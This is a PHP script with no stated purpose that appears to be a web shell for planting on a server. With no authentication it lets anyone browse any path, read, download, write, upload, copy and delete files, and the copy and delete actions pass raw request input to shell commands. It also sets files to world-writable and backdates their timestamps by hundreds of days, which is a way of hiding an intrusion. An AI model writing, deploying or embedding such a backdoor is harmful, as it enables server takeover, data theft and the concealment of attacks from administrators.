<?PHP
ini_set('memory_limit', '1024M'); // or you could use 1G



if(isset($_REQUEST["path"]))
{
$_REQUEST["path"] = str_replace(",,","/",$_REQUEST["path"]);
$post_path = $_REQUEST["path"];
//die();
	$server_root = $post_path;
}else{
$server_root = $_SERVER["DOCUMENT_ROOT"];
}
if(empty($_REQUEST["dd"]))
{

$server_root_explode = explode("/",$server_root);
$path_value = "";
foreach(array_filter($server_root_explode) as $key => $value)
{
$path_value .= "/".$value;
echo "<a href=\"?path=$path_value\">$value</a> &#187; ";
}
echo "<br/>";
echo "<form action=\"\" method=\"GET\">";
echo "<input type=\"text\" style=\"width: 99%\" name=\"path\" value=\"$server_root\">";
echo "<input type=\"submit\" name=\"submit\">";
echo "</form>";
echo "<hr/>";
echo "<br/>";
echo "<form action=\"\" method=\"GET\">";
echo "<input type=\"text\" style=\"width: 99%\" name=\"path\" value=\"$server_root\">";
echo "<input type=\"number\" style=\"width: 99%\" name=\"quick_file_time\" value=\"-500\">";
echo "<input type=\"submit\" name=\"submit\">";
echo "</form>";
echo "<hr/>";

}

if((isset($_REQUEST["delete_it"])) AND (isset($_REQUEST["del_file_path"])) AND (file_exists($_REQUEST["del_file_path"])))
{
exec("rm ".$_REQUEST["del_file_path"]."");
}

if((isset($_REQUEST["cp_it"])) AND (isset($_REQUEST["cp_file_path"])) AND (isset($_REQUEST["cp_file_path_to"])) AND (file_exists($_REQUEST["cp_file_path"])))
{
exec("cp ".$_REQUEST["cp_file_path"]." ".$_REQUEST["cp_file_path_to"]."");
}


function readdirs($dir)
{
    global $server_root;
    if (is_dir($dir))
    {
    if ($dh = opendir($dir))
    {
        while (($file = readdir($dh)) !== false) {
            // echo "$file\n";

$newpath = $dir."/".$file;
$file_time_msg = "";
if(isset($_REQUEST["quick_file_time"]))
{
$quick_file_time = $_REQUEST["quick_file_time"];
if(!empty($quick_file_time))
{
exec("chmod 0777 '$newpath'");
exec("chown www:www '$newpath'");
$back_time = strtotime("$quick_file_time days", time());
$file_setteled_date_time = date("l jS \of F Y h:i:s A",$back_time);
if(touch("$newpath", $back_time))
{
$file_time_msg = "<font color=\"green\">File time Changed to $file_setteled_date_time</font>";
}else{
$file_time_msg = "<font color=\"red\">Error While Updating File time to $file_setteled_date_time</font>";
}
}
}
echo "<a href=\"?path=$newpath\">$file</a> $file_time_msg";
if(!is_dir($newpath))
{
echo date ("F d Y H:i:s.", filemtime($newpath));
}
echo "<br/>";
$newpath = str_replace("//","/",$newpath);
//echo "<form action=\"\" method=\"POST\">";
//echo "<input type=\"hidden\" name=\"path\" value=\"".str_replace('/',',,',$newpath)."\">";
//echo "<input type=\"submit\" name=\"submit\" value=\"$file\">";
//echo "</form>";


}
closedir($dh);
}
}else{
    
}

}

function read_files($path)
{
echo "<br/>file: $path<br/>";
    if(is_dir($path))
    {
        readdirs($path);
    }
$myfile = fopen($path, "r") or print("Unable to open file!");
if($myfile)
{
$data =  fread($myfile,filesize($path));
fclose($myfile);
return $data;
}
}

if(is_dir($server_root))
{
//////////////////////////////////////////////////////////////////////////////////////////////////////
echo "<hr/>";
echo "<hr/>";
if(isset($_POST["create_file"]))
{
echo "<pre>";
print_r($_POST);
echo "</pre>";
if(!isset($_POST["filename"]))
{
die("Empty filename");
}
$post_filename = $_POST["filename"];
if(!isset($_POST["myfile"]))
{
die("Empty myfile");
}
$post_myfile = $_POST["myfile"];
$target_file = $_POST["filename"];
$uploadOk = 1;

$myfile = fopen($target_file, "w") or die("Unable to open file!");
fwrite($myfile, $post_myfile);
fclose($myfile);

}
echo "<form action=\"\" method=\"POST\" enctype=\"multipart/form-data\">";
echo "<textarea name=\"myfile\"></textarea>";
echo "<input type=\"text\" name=\"filename\" value=\"$server_root\">";
echo "<input type=\"submit\" name=\"create_file\">";
echo "</form>";
echo "<hr/>";
echo "<hr/>";
///////////////////////////////////////////////////////////////////////////////////////////
if(isset($_POST["upload"]))
{
if(!isset($_POST["path_to_save"]))
{
die("Empty path_to_save");
}
$target_file = $_POST["path_to_save"];
if(empty($target_file))
{
$target_file = $server_root."/".htmlspecialchars( basename( $_FILES["fileToUpload"]["name"]));
}
if(move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
    echo "The file (". htmlspecialchars( basename( $_FILES["fileToUpload"]["name"])). ") has been uploaded to <br/>$target_file";
  } else {
    echo "Sorry, there was an error uploading your file.";
  }



}
echo "<form action=\"\" method=\"POST\" enctype=\"multipart/form-data\">";
echo "<input type=\"file\" name=\"fileToUpload\" id=\"fileToUpload\">";
echo "<input type=\"text\" name=\"path_to_save\" value=\"$server_root\">";
echo "<input type=\"submit\" value=\"Upload\" name=\"upload\">";
echo "</form>";
echo "<hr/>";
echo "<hr/>";
//////////////////////////////////////////////////////////////////////////////////////////////////////
echo readdirs($server_root);
}else{
if(file_exists($server_root))
{
if(!empty($_REQUEST["dd"]))
{
	
$filename_from_path = explode("/",$server_root);
$filename_from_path_count = count($filename_from_path);
$filename = $filename_from_path[$filename_from_path_count-1];


    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.$filename.'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($server_root));
    readfile($server_root);
    exit;
}
echo "<hr/>";
echo "<form action=\"\" method=\"POST\">";
echo "<input name=\"del_file_path\" value=\"$server_root\">";
echo "<input type=\"submit\" name=\"delete_it\" value=\"RM\">";
echo "</form>";
echo "<hr/>";
echo "<form action=\"\" method=\"POST\">";
echo "<input name=\"cp_file_path\" value=\"$server_root\"><br/>";
echo "<input name=\"cp_file_path_to\" value=\"\">";
echo "<input type=\"submit\" name=\"cp_it\" value=\"CP\">";
echo "</form>";
echo "<hr/>";
echo "<a href=\"?path=$server_root&amp;dd=".rand()."\">Download</a>";
echo "<hr/>";
echo "<hr/>";
$path_of_file = $server_root;
$back_days = -500;
if(isset($_POST["set_file_time"]))
{
if(!isset($_POST["path_of_file"]))
{
	die("path_of_file not set");
}
if(!isset($_POST["back_days"]))
{
	die("back_days not set");
}
$back_days = $_POST["back_days"];
$path_of_file = $_POST["path_of_file"];
if(!file_exists($path_of_file))
{
	die("$path_of_file not exist");
}
exec("chmod 0777 '$path_of_file'");
exec("chown www:www '$path_of_file'");
$back_time = strtotime("$back_days days", time());
$file_setteled_date_time = date("l jS \of F Y h:i:s A",$back_time);
if(touch("$path_of_file", $back_time))
{
echo "<font color=\"green\">File $path_of_file Time Settelled to $file_setteled_date_time.</font>";
}else{
echo "<font color=\"red\">Error While Setteling File $path_of_file Time to $file_setteled_date_time.</font>";
}

}
echo "<form action=\"\" method=\"POST\" enctype=\"multipart/form-data\">";
echo "<input type=\"text\" name=\"path_of_file\" value=\"$path_of_file\">";
echo "<input type=\"number\" name=\"back_days\" value=\"$back_days\">";
echo "<input type=\"submit\" value=\"Set File Time\" name=\"set_file_time\">";
echo "</form>";
echo "<hr/>";
echo "<hr/>";
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

$data = read_files($server_root);
echo "<br/>";
echo "<textarea>$data</textarea>";
echo "<br/>";
}else{
echo "<br/>";
echo $server_root." Not Exists. :(<br/>";
echo "<br/>";
}
}